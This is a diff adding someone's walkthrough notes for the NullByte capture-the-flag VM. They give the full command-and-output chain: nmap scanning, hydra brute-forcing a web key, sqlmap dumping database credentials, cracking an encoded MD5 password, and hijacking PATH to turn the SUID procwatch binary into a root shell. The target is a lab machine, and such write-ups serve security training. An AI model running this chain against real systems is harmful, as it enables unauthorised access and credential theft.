@@ -1,0 +1,195 @@
+└─$ nmap -A -p 80,111,777,59034  192.168.56.146
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 23:20 PDT
+Nmap scan report for 192.168.56.146
+Host is up (0.00067s latency).
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-title: Null Byte 00 - level 1
+|_http-server-header: Apache/2.4.10 (Debian)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          33704/udp   status
+|   100024  1          41161/tcp6  status
+|   100024  1          51717/udp6  status
+|_  100024  1          59034/tcp   status
+777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
+|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
+|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
+|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
+59034/tcp open  status  1 (RPC #100024)
+MAC Address: 08:00:27:CE:CC:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+
+└─$ exiftool main.gif   
+ExifTool Version Number         : 13.10
+File Name                       : main.gif
+Directory                       : .
+File Size                       : 17 kB
+File Modification Date/Time     : 2025:05:13 00:17:39-07:00
+File Access Date/Time           : 2025:05:13 00:17:39-07:00
+File Inode Change Date/Time     : 2025:05:13 00:17:41-07:00
+File Permissions                : -rw-rw-r--
+File Type                       : GIF
+File Type Extension             : gif
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-): kzMb5nVYJw
+Image Size                      : 235x302
+Megapixels                      : 0.071
+
+http://192.168.56.146/kzMb5nVYJw/index.php
+//try to hydra it.
+└─$ hydra -l '' -P /home/ed/test.txt 192.168.56.146 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid" -V 
+
+[ATTEMPT] target 192.168.56.146 - login "admin" - pass "crusher" - 25261 of 14344399 [child 0] (0/0)
+[80][http-post-form] host: 192.168.56.146   login: admin   password: elite
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-13 00:30:56
+
+
+$ sqlmap -u http://192.168.56.146/kzMb5nVYJw/420search.php?usrtosearch= --dbs 
+
+[00:43:49] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.5
+[00:43:49] [INFO] fetching database names
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] seth
+
+─$ sqlmap -u http://192.168.56.146/kzMb5nVYJw/420search.php?usrtosearch= -D seth -T users -C user --dump
+[00:46:46] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.5
+[00:46:46] [INFO] fetching entries of column(s) '`user`' for table 'users' in database 'seth'
+Database: seth
+Table: users
+[2 entries]
++--------+
+| user   |
++--------+
+| ramses |
+| isis   |
++--------+
+
+
+└─$ sqlmap -u http://192.168.56.146/kzMb5nVYJw/420search.php?usrtosearch= -D seth -T users -C pass --dump
+[00:46:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.5
+[00:46:58] [INFO] fetching entries of column(s) 'pass' for table 'users' in database 'seth'
+Database: seth
+Table: users
+[2 entries]
++---------------------------------------------+
+| pass                                        |
++---------------------------------------------+
+| YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
+| --not allowed--                             |
++---------------------------------------------+
+
+YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE //base64 decode
+c6d6bd7ebf806f43c76acc3681703b81 //hash md5
+omega  //ramses
+
+phpmyadmin       | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 - sunnyvale
+
+
+
+└─$ ssh ramses@192.168.56.146 -p 777
+ramses@192.168.56.146's password: 
+
+ramses@NullByte:~$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+eric:x:1001:1001:,,,:/home/eric:/bin/bash
+ramses:x:1002:1002:,,,:/home/ramses:/bin/bash
+
+ramses@NullByte:/var/www/backup$ echo '/bin/sh' > ps
+ramses@NullByte:/var/www/backup$ ls -la
+total 28
+drwxrwxrwx 2 root   root   4096 May 14 01:33 .
+drwxr-xr-x 4 root   root   4096 Aug  2  2015 ..
+-rwsr-xr-x 1 root   root   4932 Aug  2  2015 procwatch
+-rwxrwxrwx 1 ramses ramses    8 May 14 01:35 ps
+-rw-r--r-- 1 root   root     28 Aug  2  2015 readme.txt
+-rwxr-xr-x 1 ramses ramses   10 May 14 01:32 sh
+ramses@NullByte:/var/www/backup$ echo $PATH
+/var/www/backup:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+ramses@NullByte:/var/www/backup$ ./procwatch 
+# id
+uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
+# whoami
+root
+# cd /root
+# ls
+proof.txt
+# cat proof.txt	
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats. 
+Now you done that I wanna talk with you. Write a walk & mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+ramses@NullByte:/var/www/html$ find / -perm -u=s 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/pt_chown
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/procmail
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/sbin/exim4
+/var/www/backup/procwatch
+/bin/su
+/bin/mount
+/bin/umount
+
+USE THIS PGP PUBLIC KEY
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
+
+mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
++z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+Gms=
+=PiAQ
+-----END PGP PUBLIC KEY BLOCK-----
